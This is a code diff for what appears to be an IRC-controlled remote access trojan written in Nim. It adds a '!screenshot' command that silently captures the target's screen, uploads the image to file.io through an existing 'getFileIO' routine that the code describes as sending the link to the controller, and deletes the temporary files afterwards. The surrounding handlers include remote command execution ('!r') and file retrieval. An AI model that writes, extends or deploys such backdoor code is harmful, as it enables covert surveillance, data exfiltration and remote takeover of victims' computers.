@@ -1,4 +1,4 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random
 
 let
     g_dbg* = true
@@ -142,7 +142,7 @@ proc rexec_changeDir(path:string):Future[bool] {.async.} =
 
 
 ## Uploads target file from target machine to file.io, sends link to controller
-proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
+proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} = 
     var filename = await helper_recombine(tokens,1)
 
     if fileExists(filename):
@@ -334,6 +334,36 @@ proc cmd_setSendSleep(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.asy
 
 
 
+proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
+    try:
+        randomize()
+        var
+            rand_dir_dame = rand(100000..999999)
+            rand_filename = rand(100000..999999)
+            scrndir = getTempDir() & $rand_dir_dame
+        if not dirExists(scrndir):
+            createDir(scrndir)
+
+        srcn_screenshot(scrndir & "\\" & $rand_filename & ".bmp")
+        
+        if not fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
+            discard client.privmsg(event.origin, "failed to create screenshot")
+            if dirExists(scrndir):
+                removeDir(scrndir)
+            return
+        else:
+            var faketokens:seq[string] = @["",scrndir & "\\" & $rand_filename & ".bmp"]
+            await cmd_getFileIO(event, client, faketokens)
+            if fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
+                removeFile(scrndir & "\\" & $rand_filename & ".bmp")
+            if dirExists(scrndir):
+                removeDir(scrndir)
+            return
+    except OSError as e:
+        discard client.privmsg(event.origin, "there was trouble while taking the screenshot [" & repr(e) & "]")
+
+
+
 ## Checks if a private message was a command and calls appropriate functions
 proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
     var
@@ -357,7 +387,7 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
     of "!r": #remote execution
         discard cmd_rexec(event, client, tokens)
     of "!getfio":
-        discard cmd_getFileIO(event, client, tokens, false)
+        discard cmd_getFileIO(event, client, tokens)
     of "!get":
         if tokens[high(tokens)] == "!":
             var ftokens = tokens
@@ -380,4 +410,6 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
         spawn cmd_abort()
     of "!sendsleep":
         discard cmd_setSendSleep(event, client, tokens)
+    of "!screenshot":
+        discard cmd_screenshot(event, client)
         
